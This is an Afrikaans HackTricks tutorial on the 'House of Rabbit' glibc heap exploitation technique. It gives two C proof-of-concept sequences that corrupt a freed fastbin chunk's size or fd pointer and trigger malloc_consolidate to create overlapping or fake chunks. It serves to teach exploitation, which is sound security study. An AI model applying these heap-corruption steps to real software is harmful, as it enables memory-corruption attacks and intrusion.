# Huis van die Haas

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

### Vereistes

1. **Vermoeë om vinnige bin fd-aanwyser of grootte te wysig**: Dit beteken jy kan die voorwaartse aanwyser van 'n stuk in die vinnige bin verander of sy grootte.
2. **Vermoeë om `malloc_consolidate` te aktiveer**: Dit kan gedoen word deur óf 'n groot stuk toe te ken óf die boonste stuk saam te voeg, wat die hoop dwing om stukke te konsolideer.

### Doelwitte

1. **Skep oorvleuelende stukke**: Om een stuk met 'n ander te laat oorvleuel, wat verdere hoopmanipulasies moontlik maak.
2. **Vals stukke vervals**: Om die toewysingsprogram in die val te lok om 'n vals stuk as 'n regmatige stuk tydens hoopoperasies te behandel.

## Stappe van die aanval

### POC 1: Wysig die grootte van 'n vinnige bin-stuk

**Doel**: Skep 'n oorvleuelende stuk deur die grootte van 'n vinnige bin-stuk te manipuleer.

* **Stap 1: Ken Stukke Toe**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Stap 2: Vrygemaakte brokke**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
### Ons maak albei brokke vry, en voeg hulle by die fastbin lys.

* **Stap 3: Wysig Brok Grootte**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
### Ons verander die grootte metadata van `chunk1` na 0xa1. Dit is 'n noodsaaklike stap om die toewysingsprogram tydens konsolidasie te mislei.

* **Stap 4: Trigger `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
### POC 2: Wysig die `fd` wyser

**Doelwit**: Skep 'n vals blokkie deur die vinnige bin `fd` wyser te manipuleer.

* **Stap 1: Allokeer Blokkies**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Verduideliking**: Ons ken twee stukke toe, een kleiner en een groter, om die heap op te stel vir die vals stuk.

* **Stap 2: Skep vals stuk**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Stap 3: Vry `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Verduideliking**: Ons vry `chunk1`, deur dit by die fastbin-lys te voeg.

* **Stap 4: Wysig `fd` van `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Verduideliking**: Ons verander die voorwaartse wyser (`fd`) van `chunk1` om te wys na ons valse stuk binne `chunk2`.

* **Stap 5: Trigger `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
### Opsomming

Die **Huis van die Has** tegniek behels óf die wysiging van die grootte van 'n vinnige bin stuk om oorvleulende stukke te skep óf die manipulasie van die `fd` aanwyser om vals stukke te skep. Dit stel aanvallers in staat om legitieme stukke in die hoop te vervals, wat verskeie vorme van uitbuiting moontlik maak. Die begrip en beoefening van hierdie stappe sal jou hoop-uitbuiting vaardighede verbeter.
